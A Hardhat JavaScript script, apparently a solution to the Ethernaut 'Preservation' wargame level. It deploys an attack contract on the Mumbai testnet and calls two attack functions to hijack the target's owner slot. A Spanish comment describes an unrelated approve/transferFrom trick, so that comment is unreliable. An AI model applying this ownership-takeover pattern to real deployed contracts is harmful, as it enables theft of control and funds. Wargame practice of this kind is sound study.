const { ethers } = require("hardhat")
// const {
//   abi: ABIPreservation,
// } = require("../../artifacts/contracts/15/Preservation.sol/Preservation.json")
const { logTxResult } = require("../../utils/logTxResult")

require("dotenv").config()
const _provider = process.env.PROVIDER_MUMBAI
const privateKey = process.env.PRIVATE_KEY

const provider = new ethers.providers.JsonRpcProvider(_provider)
const signer = new ethers.Wallet(privateKey, provider)

/* DEPLOY + ATTACK */
/* Hay que aprovar un address para despues llamar a transferFrom. Esta ultima funcion no tiene el lock
Se puede dar allowance de address0 a address0. Asi, no nos hace falta otra wallet
*/
async function main() {
  // const preservationAddress = "0x88279511049Db94172cce04E6253c48eacF565e6"
  /* instance */
  // const PreservationContract = new ethers.Contract(
  //   preservationAddress,
  //   ABIPreservation,
  //   provider
  // )

  /* CONTRACT NAME */
  const contractToDeploy = "PreservationAttack"
  const MyContract = await ethers.getContractFactory(contractToDeploy)
  const PreservationAttackContract = await MyContract.deploy()
  console.log("PreservationAttackContract", PreservationAttackContract.address)

  /*  */
  const tx0 = await PreservationAttackContract.connect(
    provider
  ).view_timeZoneAfterChange()
  console.log("tx0", tx0)

  const tx = await PreservationAttackContract.connect(
    signer
  ).attackPreservation1({
    gasLimit: 10000000,
  })
  const res = await tx.wait()
  logTxResult(res)

  const tx1_2 = await PreservationAttackContract.connect(
    provider
  ).view_timeZoneAfterChange()
  console.log("tx1_2", tx1_2)

  const tx2 = await PreservationAttackContract.connect(
    signer
  ).attackPreservation2({
    gasLimit: 10000000,
  })
  const res2 = await tx2.wait()
  logTxResult(res2)

  const tx3 = await PreservationAttackContract.connect(
    provider
  ).view_ownerAfterChange()
  console.log("tx3", tx3)
}

main()
  .then(async (myContract) => {})
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })

/* 
  npx hardhat run contracts/16/DeployAndCall__Attack.js --network mumbai
*/
